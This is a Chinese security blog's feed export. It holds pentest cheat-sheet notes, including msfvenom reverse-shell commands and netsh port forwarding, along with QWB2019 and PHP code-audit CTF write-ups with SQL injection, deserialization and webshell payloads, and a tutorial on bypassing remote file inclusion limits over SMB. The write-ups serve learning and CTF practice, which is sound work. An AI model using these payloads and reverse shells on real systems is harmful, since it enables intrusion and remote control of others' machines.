id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>　　msfvenom -p cmd/unix/reverse_python LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.py</Your></Your></p><h1 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h1><p>　　msfvenom -p cmd/unix/reverse_bash LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.sh</Your></Your></p><h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><p>　　msfvenom -p cmd/unix/reverse_perl LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.pl</Your></Your></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pentest tips</title>
      <link href="/2020/05/03/pentest/"/>
      <url>/2020/05/03/pentest/</url>
      
        <content type="html"><![CDATA[<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>nmap -sS -p 1-65535 -v 192.168.1.254<br>nmap -sV 10.10.10.11<br>nmap -sV -sT -sC -T5 10.10.10.122<br>nmap -sC -sV -sS</p><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="cmd进行端口转发"><a href="#cmd进行端口转发" class="headerlink" title="cmd进行端口转发"></a>cmd进行端口转发</h2><p>把来自外部的 tcp 的6666端口流量全部转发到内网的2008r2机器的3389端口上，执行以下两条命令</p><pre><code>netsh advfirewall firewall add rule name=&quot;winmgmt&quot; dir=in action=allow protocol=TCP localport=6666netsh interface portproxy add v4tov4 listenport=6666 connectaddress=192.168.2.57 connectport=3389</code></pre><p><img src="/2020/05/03/pentest/image-20200503104122591.png" alt></p><h2 id="切换成交互式shell"><a href="#切换成交互式shell" class="headerlink" title="切换成交互式shell"></a>切换成交互式shell</h2><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>参考<a href="https://www.freebuf.com/news/142195.html" target="_blank" rel="noopener">https://www.freebuf.com/news/142195.html</a><br><img src="/2020/05/03/pentest/image-20200503104154689.png" alt></p><h2 id="SMB服务"><a href="#SMB服务" class="headerlink" title="SMB服务:"></a>SMB服务:</h2><p>匿名身份进行资源枚举:smbmap -H 10.10.10.152</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>装环境</title>
      <link href="/2020/05/02/%E8%A3%85%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/05/02/%E8%A3%85%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h1><p>安装之后右键没有快捷打开方式，网上查找教程后修改注册表，过程如下：</p><p>1.win+R打开cmd窗口，输入regedit,打开注册表</p><p>2.找到HKEY_CLASSESS_ROOT-&gt;*-&gt;Shell，下面新建项，命名为Edit with Sublime Text3</p><p>3.在“Edit with Sublime Text”下新建字符串值，命名为Icon，值为 D:\Program Files\Sublime Text 3\sublime_text.exe,0</p><p>4.在项“Edit with Sublime Text”下新建项Command，Command项下默认值修改为 D:\Program Files\Sublime Text 3\sublime_text.exe\sublime_text.exe %1</p><p>结果虽然出现快捷键，但无法打开文件内容</p><p>经过多番尝试=-=，Command项下默认值需修改为 “D:\Program Files\Sublime Text 3\sublime_text.exe\sublime_text.exe” “%1”</p><p><img src="/2020/05/02/%E8%A3%85%E7%8E%AF%E5%A2%83/image-20200502093121526.png" alt></p><h1 id="firefox插件"><a href="#firefox插件" class="headerlink" title="firefox插件"></a>firefox插件</h1><p>1.hackbar</p><p>2.Proxy SwitchyOmega</p><p>3.LastPass: Free Password Manager</p><p>4.User-Agent Switcher</p><p>5.HTTP Header Live</p><p>6.Evernote Web Clipper</p><p>7.Infinity 新标签页 (Pro)</p><p>8.Ghostery</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QWB2019-WEB-WP</title>
      <link href="/2019/05/29/QWB2019-WEB-WP/"/>
      <url>/2019/05/29/QWB2019-WEB-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><blockquote><p>如题名描述，是一道注入题。<br>Fuzz一下，发现</p><ul><li>1.WAF<br>return preg_match(“/select|update|delete|drop|insert|where|./i”, $inject);</li><li>2.通过报错注入出来的数据库名（supersqli）、用户等信息（果然是随便注）</li></ul></blockquote><blockquote><p>猜测后台SQL语句应该为：<br>select * from supersqli.table_name where id=’’ ;</p></blockquote><blockquote><p>由于过滤了select关键词，无法自定义进行数据查询操作。<br>经过进一步的测试后发现可以堆叠注入，通过’;show tables from supersqli;#等payload可以得知flag存在于1919810931114514表的flag字段中。</p></blockquote><blockquote><p>这里还是由于select被过滤不能自定义查询内容，结合后台SQL语句，得出思路：将1919810931114514表改名为words，这样在后台SQL语句不变的情况下仍然可以查询得到flag的内容。</p></blockquote><blockquote><p>最终payload如下：</p><pre><code class="mysql">&#39;;ALTER TABLE `1919810931114514` ADD `id` INT(1) NOT NULL DEFAULT &#39;1&#39; AFTER `flag`;%23</code></pre><p>（由于1919810931114514表中并没有id列，因此先添加id列）</p><pre><code class="mysql">&#39;;alter+table+`1919810931114514`+rename+to+`xxx`;alter+table+`words`+rename+to+`zzz`;alter+table+`xxx`+rename+to+`words`;%23</code></pre><p>最后直接查询就可以得到原1919810931114514表中的内容。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/6934571-f144d83797a04d4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><blockquote><p>赛后学习一波<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485809&idx=1&sn=5bde7da3fb89627829e037d2df960e7b&chksm=e89e21a9dfe9a8bf6cde9b14462193f5865a8ad78d75e77fb567717447a837cc189e42d41e27&mpshare=1&scene=1&srcid=05296ovJe1icseWeNedSPv3U&from=groupmessage&ascene=1&devicetype=android-28&version=2700043b&nettype=ctnet&abtest_cookie=BQABAAgACgALABIAEwAHAJ2GHgAjlx4AVpkeAM%2BZHgDcmR4A85keAAOaHgAAAA%3D%3D&lang=zh_CN&pass_ticket=l2CBPd8S9ZSwWXiBrOmoQ%2BclBwI22yXQErXXW5VGi04PAIUleF0OG51jkZMsZdJ6&wx_header=1" target="_blank" rel="noopener">ChaMd5师傅的操作</a></p></blockquote><pre><code>1&#39;;create procedure vk()begin  Set @v_sql=concat(&#39;sel&#39;,&#39;ect * from `1919810931114514`;&#39;);  Prepare stmt from @v_sql;  EXECUTE stmt;  deallocate Prepare stmt;end;call vk();-- -</code></pre><h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><blockquote><p>下载<a href="http://www.tar.gz后发现是3000多个“木马”文件。" target="_blank" rel="noopener">www.tar.gz后发现是3000多个“木马”文件。</a><br>简单审计一下发现虽然有很多命令执行的地方，但在此之前都已经将GET或POST参数赋空值，或者加上恒为假的if判断，于是乎写了个脚本提取每个文件中的GET、POST参数，在本地测试是否能够命令执行，最终在测试GET参数的过程中发现其中一个能用的shell并且获得其参数。</p></blockquote><pre><code>import requestsimport reimport osfrom time import sleepflies = os.listdir(&#39;./src&#39;)for i in flies:    url = &#39;http://127.0.0.1/src/&#39;+i    f = open(&#39;./src/&#39;+i)    data = f.read()    f.close()    reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)    params = reg.findall(data)    for j in params:        payload = url + &#39;/?&#39; + j + &#39;=echo 123456123456123456123456&#39;        print payload        req=requests.get(payload)        if &#39;123456123456123456123456&#39; in req.content:            print payload            exit();</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/6934571-c127144a8243b768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/6934571-a24a9ea0150985e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><blockquote><p>下载备份文件<a href="http://www.tar.gz进行源码审计" target="_blank" rel="noopener">www.tar.gz进行源码审计</a><br>漏洞点在Profile类中的upload_img()函数中：</p></blockquote><pre><code>    public function upload_img(){        if($this-&gt;checker){            if(!$this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if(!empty($_FILES)){            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        }        if($this-&gt;ext) {            if(getimagesize($this-&gt;filename_tmp)) {                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;                $this-&gt;update_img();            }else{                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));            }        }else{            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));        }    }</code></pre><p>通过<code>copy($this-&gt;filename_tmp, $this-&gt;filename);</code>就可以任意更改文件名了。<br>exp如下：</p><pre><code>class Register{    public $checker;    public $registed;}class Profile {    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;}$check = new Register();$check-&gt;registed=0;$check-&gt;checker = new Profile();$check-&gt;checker-&gt;except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);$check-&gt;checker-&gt;ext=1;$check-&gt;checker-&gt;filename_tmp=&quot;./upload/98acc62aa02eda032d1caed497ce72a0/0412c29576c708cf0155e8de242169b1.png&quot;;$check-&gt;checker-&gt;filename=&quot;./upload/98acc62aa02eda032d1caed497ce72a0/0412c29576c708cf0155e8de242169b1.php&quot;;echo base64_encode(serialize($cheeck));</code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RFI 绕过 getshell</title>
      <link href="/2019/05/29/RFI-%E7%BB%95%E8%BF%87-getshell/"/>
      <url>/2019/05/29/RFI-%E7%BB%95%E8%BF%87-getshell/</url>
      
        <content type="html"><![CDATA[<p>在Seebug看到<a href="https://paper.seebug.org/923/" target="_blank" rel="noopener">RFI 绕过 URL 包含限制 getshell</a>这篇文章，本地调试学习记录一波。</p><p>主要描述php在配置如下时，如何使用SMB协议在局域网内突破远程文件包含getshell。</p><pre><code>allow_url_fopen=offallow_url_include=off</code></pre><p>通过上述配置，PHP不加载远程HTTP或FTP URL，进而防止远程文件包含攻击。但即使<code>allow_url_include</code>和<code>allow_url_fopen</code>都设置为off，PHP也不会阻止SMB URL加载。</p><p>本地进行简单的测试</p><p>include.php</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];include($file);?&gt;</code></pre><p>在远程服务器上安装SAMBA服务器：</p><pre><code>apt-get install samba</code></pre><p>创建SMB共享目录：</p><pre><code>mkdir /var/www/html/pub/ </code></pre><p>配置新创建的SMB共享目录的权限：</p><pre><code>chmod 0555 /var/www/html/pub/chown -R nobody:nogroup /var/www/html/pub/</code></pre><p>修改SAMBA服务器配置文件（/etc/samba/smb.conf）内容如下：</p><pre><code>[global]workgroup = WORKGROUPserver string = Samba Server %vnetbios name = indishell-labsecurity = usermap to guest = bad username resolve order = bcast hostdns proxy = nobind interfaces only = yes[ethan]path = /var/www/html/pubwritable = noguest ok = yesguest only = yesread only = yesdirectory mode = 0555force user = nobody</code></pre><p>重新启动SAMBA服务器</p><pre><code>service smbd restart</code></pre><p>同时在/var/www/html/pub/文件夹中放置webshell<br>通过访问<code>file=\\192.168.6.131\ethan\ant.php</code>成功包含远程shell<br><img src="/2019/05/29/RFI-%E7%BB%95%E8%BF%87-getshell/image-20200503094833670.png" alt><br><img src="/2019/05/29/RFI-%E7%BB%95%E8%BF%87-getshell/image-20200503094807579.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP敏感函数</title>
      <link href="/2019/05/22/PHP%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/"/>
      <url>/2019/05/22/PHP%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a><a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">parse_url()</a></h2><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a><a href="http://www.am0s.com/functions/386.html" target="_blank" rel="noopener">file_put_contents()</a></h2><h2 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode()"></a><a href="http://www.am0s.com/functions/383.html" target="_blank" rel="noopener">json_encode()</a></h2><h2 id="imagecreatefromgif"><a href="#imagecreatefromgif" class="headerlink" title="imagecreatefromgif()"></a><a href="http://www.am0s.com/functions/323.html" target="_blank" rel="noopener">imagecreatefromgif()</a></h2><h2 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a><a href="http://www.am0s.com/functions/264.html" target="_blank" rel="noopener">mt_rand()</a></h2><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a><a href="http://www.am0s.com/functions/261.html" target="_blank" rel="noopener">addslashes()</a></h2><h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv()"></a><a href="http://www.am0s.com/functions/256.html" target="_blank" rel="noopener">iconv()</a></h2><h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a><a href="http://www.am0s.com/functions/248.html" target="_blank" rel="noopener">move_uploaded_file()</a></h2><h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><a href="http://www.am0s.com/functions/247.html" target="_blank" rel="noopener">session_id()</a></h2><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a><a href="http://www.am0s.com/functions/240.html" target="_blank" rel="noopener">in_array()</a></h2><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a><a href="http://www.am0s.com/functions/238.html" target="_blank" rel="noopener">parse_str()</a></h2><h2 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a><a href="http://www.am0s.com/functions/237.html" target="_blank" rel="noopener">escapeshellarg()</a></h2><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a><a href="http://www.am0s.com/functions/235.html" target="_blank" rel="noopener">create_function()</a></h2><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a><a href="http://www.am0s.com/functions/233.html" target="_blank" rel="noopener">preg_replace()</a></h2><h2 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a><a href="http://www.am0s.com/functions/227.html" target="_blank" rel="noopener">escapeshellcmd()</a></h2><h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a><a href="http://www.am0s.com/functions/226.html" target="_blank" rel="noopener">urldecode()</a></h2><h2 id="copy"><a href="#copy" class="headerlink" title="copy()"></a><a href="http://www.am0s.com/functions/222.html" target="_blank" rel="noopener">copy()</a></h2><h2 id="return"><a href="#return" class="headerlink" title="return()"></a><a href="http://www.am0s.com/functions/221.html" target="_blank" rel="noopener">return()</a></h2><h2 id="exit"><a href="#exit" class="headerlink" title="exit()"></a><a href="http://www.am0s.com/functions/210.html" target="_blank" rel="noopener">exit()</a></h2><h2 id="eregi"><a href="#eregi" class="headerlink" title="eregi()"></a><a href="http://www.am0s.com/functions/203.html" target="_blank" rel="noopener">eregi()</a></h2><h2 id="md5"><a href="#md5" class="headerlink" title="md5()"></a><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">md5()</a></h2><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a><a href="http://www.am0s.com/functions/201.html" target="_blank" rel="noopener">strcmp()</a></h2><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a><a href="http://www.am0s.com/functions/199.html" target="_blank" rel="noopener">is_numeric()</a></h2><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a><a href="http://www.am0s.com/functions/193.html" target="_blank" rel="noopener">intval()</a></h2><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a><a href="http://www.am0s.com/functions/181.html" target="_blank" rel="noopener">htmlspecialchars()</a></h2><h2 id="usort"><a href="#usort" class="headerlink" title="usort()"></a><a href="http://www.am0s.com/functions/97.html" target="_blank" rel="noopener">usort()</a></h2><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a><a href="http://www.am0s.com/functions/87.html" target="_blank" rel="noopener">extract()</a></h2><h2 id="Mail"><a href="#Mail" class="headerlink" title="Mail()"></a><a href="http://www.am0s.com/functions/77.html" target="_blank" rel="noopener">Mail()</a></h2>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计——EASY CTF篇</title>
      <link href="/2019/05/22/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94EASY-CTF%E7%AF%87/"/>
      <url>/2019/05/22/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94EASY-CTF%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-extract变量覆盖"><a href="#0x01-extract变量覆盖" class="headerlink" title="0x01 extract变量覆盖"></a>0x01 extract变量覆盖</h1><pre><code>&lt;?php$flag=&#39;xxx&#39;; extract($_GET); if(isset($shiyan)) {     $content=trim(file_get_contents($flag));    if($shiyan==$content)    {         echo&#39;ctf{xxx}&#39;;     }   else   {     echo&#39;Oh.no&#39;;   }    }?&gt;</code></pre><blockquote><p>?shiyan=&amp;flag=1<br><code>在file_get_contents($flag)过程时出错，返回$content为空，通过$shiyan==$content判断</code><br><img src="https://upload-images.jianshu.io/upload_images/6934571-e2bceb8157023171.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p></blockquote><h1 id="0x02-绕过过滤的空白字符"><a href="#0x02-绕过过滤的空白字符" class="headerlink" title="0x02 绕过过滤的空白字符"></a>0x02 绕过过滤的空白字符</h1><pre><code>&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值error_reporting(0); //关闭所有PHP错误报告if(!isset($_GET[&#39;number&#39;])){   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt   die(&quot;have a fun!!&quot;); //die — 等同于 exit()}foreach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式     foreach($global_var as $key =&gt; $value) {         $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    } } function is_palindrome_number($number) {     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) {         if($number[$i] !== $number[$j]) {             return false;         }         $i++;         $j--;     }     return true; } if(is_numeric($_REQUEST[&#39;number&#39;])) //is_numeric — 检测变量是否为数字或数字字符串 ，此处要求number非纯数字{   $info=&quot;sorry, you cann&#39;t input a number!&quot;;}elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))) //intval — 获取变量的整数值，此处要求number与intval(number)的字符串值一致，而%0c在这一过程中将保留{     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  }else{     $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));       if($value1!=$value2){//此处要求number变量数字部分与其反转后相同          $info=&quot;no, this is not a palindrome number!&quot;;     }     else     {          if(is_palindrome_number($req[&quot;number&quot;])){              $info = &quot;nice! {$value1} is a palindrome number!&quot;;           }          else          {             $info=$flag;          }     }}echo $info;</code></pre><blockquote><p>?number=%00%0c191</p><ul><li><code>%00使if(is_numeric($_REQUEST[&#39;number&#39;])) 和elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;])))均返回false；</code></li><li><code>intval和is_numeric都会忽略\f（也就是%0c）这个字符,使number值为191；</code></li><li><code>而在if(is_palindrome_number($req[&quot;number&quot;]))判断中，strval($number)值为\f191，从而使$number[$i]为\f， $number[$j]为1通过if($number[$i] !== $number[$j]) 的判断返回false。</code><br><img src="https://upload-images.jianshu.io/upload_images/6934571-714b93fd5ce768ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/6934571-363f1ba96d37eca2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></li></ul></blockquote><h1 id="0x03-多重加密"><a href="#0x03-多重加密" class="headerlink" title="0x03 多重加密"></a>0x03 多重加密</h1><pre><code>&lt;?php    include &#39;common.php&#39;;    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);    //把一个或多个数组合并为一个数组    class db    {        public $where;        function __wakeup()        {            if(!empty($this-&gt;where))            {                $this-&gt;select($this-&gt;where);            }        }        function select($where)        {            $sql = mysql_query(&#39;select * from user where &#39;.$where);            //函数执行一条 MySQL 查询。            return @mysql_fetch_array($sql);            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false        }    }    if(isset($requset[&#39;token&#39;]))    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。    {        $login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));        //gzuncompress:进行字符串压缩        //unserialize: 将已序列化的字符串还原回 PHP 的值        $db = new db();        $row = $db-&gt;select(&#39;user=\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。        if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)        {            echo $flag;        }else if($row[&#39;pass&#39;] !== $login[&#39;pass&#39;]){            echo &#39;unserialize injection!!&#39;;        }else{            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;        }    }else{        header(&#39;Location: index.php?error=1&#39;);    }?&gt; </code></pre><blockquote><p><code>判断条件只有一个：if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)</code><br><code>而$login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));</code><br>因此只需要传递一个符合要求的序列化值即可，脚本如下：</p></blockquote><pre><code>&lt;?php$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);$token = base64_encode(gzcompress(serialize($arr)));print_r($token);?&gt;//eJxLtDK0qs60MrBOAuJaAB5uBBQ=</code></pre><h1 id="0x04-SQL注入-WITH-ROLLUP绕过"><a href="#0x04-SQL注入-WITH-ROLLUP绕过" class="headerlink" title="0x04 SQL注入_WITH ROLLUP绕过"></a>0x04 SQL注入_WITH ROLLUP绕过</h1><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {    echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){//检测变量是否是数组        $StrValue=implode($StrValue);//返回由数组元素组合成的字符串    }    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){   //匹配成功一次后就会停止匹配        print &quot;水可载舟，亦可赛艇！&quot;;        exit();    }}$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value){ //遍历数组    AttackFilter($key,$value,$filter);}$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con){    die(&#39;Could not connect: &#39; . mysql_error());}$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);//设置活动的 MySQL 数据库$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;$query = mysql_query($sql); //执行一条 MySQL 查询if (mysql_num_rows($query) == 1) { //返回结果集中行的数目    $key = mysql_fetch_array($query);//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print &quot;CTF{XXXXXX}&quot;;    }else{        print &quot;亦可赛艇！&quot;;    }}else{    print &quot;一颗赛艇！&quot;;}mysql_close($con);?&gt;</code></pre><blockquote><p><code>admin&#39; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -</code><br>拼接后的SQL语句为：<br><code>SELECT * FROM interest WHERE uname = &#39;admin&#39; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -</code><br>因此可以通过注入payload使username仍为admin，但password为空。<br><img src="https://upload-images.jianshu.io/upload_images/6934571-67240bb7d31f092e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>POST：<br><code>username=admin&#39; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -&amp;password=</code><br><img src="https://upload-images.jianshu.io/upload_images/6934571-2645edb56bc37de8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p></blockquote><h1 id="0x05-sha-函数比较绕过"><a href="#0x05-sha-函数比较绕过" class="headerlink" title="0x05 sha()函数比较绕过"></a>0x05 sha()函数比较绕过</h1><pre><code>&lt;?php$flag = &quot;flag&quot;;if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;?&gt;</code></pre><blockquote><p>?name[]=1&amp;password[]=2<br>sha1()函数默认的传入参数类型是字符串型，当传入数组时均会返回false，通过判断。</p></blockquote><h1 id="0x06-SESSION验证绕过"><a href="#0x06-SESSION验证绕过" class="headerlink" title="0x06 SESSION验证绕过"></a>0x06 SESSION验证绕过</h1><pre><code>&lt;?php$flag = &quot;flag&quot;;session_start(); if (isset ($_GET[&#39;password&#39;])) {    if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])        die (&#39;Flag: &#39;.$flag);    else        print &#39;&lt;p&gt;Wrong guess.&lt;/p&gt;&#39;;}mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;</code></pre><blockquote><p>?password=<br>初始状态session为空，因此password也传入空值即可</p></blockquote><h1 id="0x07-md5加密相等绕过"><a href="#0x07-md5加密相等绕过" class="headerlink" title="0x07 md5加密相等绕过"></a>0x07 md5加密相等绕过</h1><blockquote><p>var_dump(md5(‘240610708’) == md5(‘QNKCDZO’));<br>var_dump(md5(‘aabg7XSs’) == md5(‘aabC9RqS’));<br>var_dump(sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’));<br>var_dump(sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’));<br>var_dump(‘0010e2’ == ‘1e3’);<br>var_dump(‘0x1234Ab’ == ‘1193131’);<br>var_dump(‘0xABCdef’ == ‘ 0xABCdef’);</p></blockquote><blockquote><p>md5(‘240610708’); // 0e462097431906509019562988736854<br>md5(‘QNKCDZO’); // 0e830400451993494058024219903391 </p></blockquote><blockquote><p>pg:把你的密码设成 0x1234Ab，然后退出登录再登录，换密码 1193131登录，如果登录成功，那么密码绝对是明文保存的没跑。<br>同理，密码设置为 240610708，换密码 QNKCDZO登录能成功，那么密码没加盐直接md5保存的。<br>####0x08 intval函数四舍五入</p></blockquote><pre><code>&lt;?phpif($_GET[id]) {    $id = intval($_GET[id]);    if ($_GET[id]==1024) {        echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;    }  